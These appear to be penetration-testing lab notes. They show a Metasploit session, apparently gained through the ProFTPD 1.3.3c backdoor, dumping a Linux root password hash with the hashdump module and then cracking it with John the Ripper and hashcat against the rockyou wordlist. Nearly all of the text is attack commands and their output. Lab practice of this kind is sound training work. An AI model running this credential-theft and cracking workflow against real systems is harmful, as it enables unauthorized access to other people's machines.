# Linux
```bash
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > use post/linux/gather/hashdump
msf5 post(linux/gather/hashdump) > setg SESSION 2
SESSION => 2
msf5 post(linux/gather/hashdump) > run

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20240409102151_default_192.13.135.3_linux.hashes_089546.txt
[*] Post module execution completed
```

```bash
root@attackdefense:~# john --format=sha512crypt /root/.msf4/loot/20240409102151_default_192.13.135.3_linux.hashes_089546.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 48 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (root)
1g 0:00:00:06 DONE (2024-04-09 10:24) 0.1612g/s 990.9p/s 990.9c/s 990.9C/s 123456..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
$ hashcat -a0 -m1800 hash.txt /usr/share/wordlists/rockyou.txt.gz --potfile-disable
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6849/13763 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:password
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQ...hLQBb.
Time.Started.....: Tue Apr  9 06:29:11 2024 (0 secs)
Time.Estimated...: Tue Apr  9 06:29:11 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1410 H/s (8.49ms) @ Accel:256 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 256/14344385 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> freedom
Hardware.Mon.#1..: Util: 18%

Started: Tue Apr  9 06:29:08 2024
Stopped: Tue Apr  9 06:29:12 2024
```
